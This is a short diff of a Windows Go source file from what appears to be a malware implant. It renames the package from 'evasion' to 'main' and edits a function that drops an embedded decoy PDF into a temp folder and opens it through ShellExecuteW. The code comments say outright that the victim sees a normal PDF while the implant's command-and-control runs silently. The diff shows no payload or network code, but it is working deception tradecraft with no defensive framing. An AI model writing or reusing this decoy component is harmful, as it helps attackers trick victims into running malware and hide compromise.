@@ -1,6 +1,6 @@
 //go:build windows
 
-package evasion
+package main
 
 import (
 	_ "embed"
@@ -13,9 +13,8 @@ import (
 //go:embed decoy.pdf
 var decoyPDF []byte
 
-// DropAndOpenPDF writes the embedded decoy PDF to temp and opens it.
-// The victim sees a normal PDF while the implant runs silently.
-// Call this early in main(), before C2 registration.
+// DropAndOpenPDF writes the embedded decoy PDF to temp and opens it with default handler.
+// The victim sees a normal PDF while the implant C2 runs silently.
 func DropAndOpenPDF() {
 	if len(decoyPDF) == 0 {
 		return
@@ -26,7 +25,6 @@ func DropAndOpenPDF() {
 		return
 	}
 
-	// ShellExecuteW: open the PDF with default handler silently
 	shell32 := syscall.NewLazyDLL("shell32.dll")
 	shellExecuteW := shell32.NewProc("ShellExecuteW")
 
@@ -34,10 +32,10 @@ func DropAndOpenPDF() {
 	verbPtr, _ := syscall.UTF16PtrFromString("open")
 
 	shellExecuteW.Call(
-		0, // hwnd (NULL = no parent)
-		uintptr(unsafe.Pointer(verbPtr)), // lpOperation
-		uintptr(unsafe.Pointer(pathPtr)), // lpFile
-		0, 0, // lpParameters, lpDirectory
-		1, // nShowCmd = SW_SHOWNORMAL
+		0,
+		uintptr(unsafe.Pointer(verbPtr)),
+		uintptr(unsafe.Pointer(pathPtr)),
+		0, 0,
+		1, // SW_SHOWNORMAL
 	)
 }
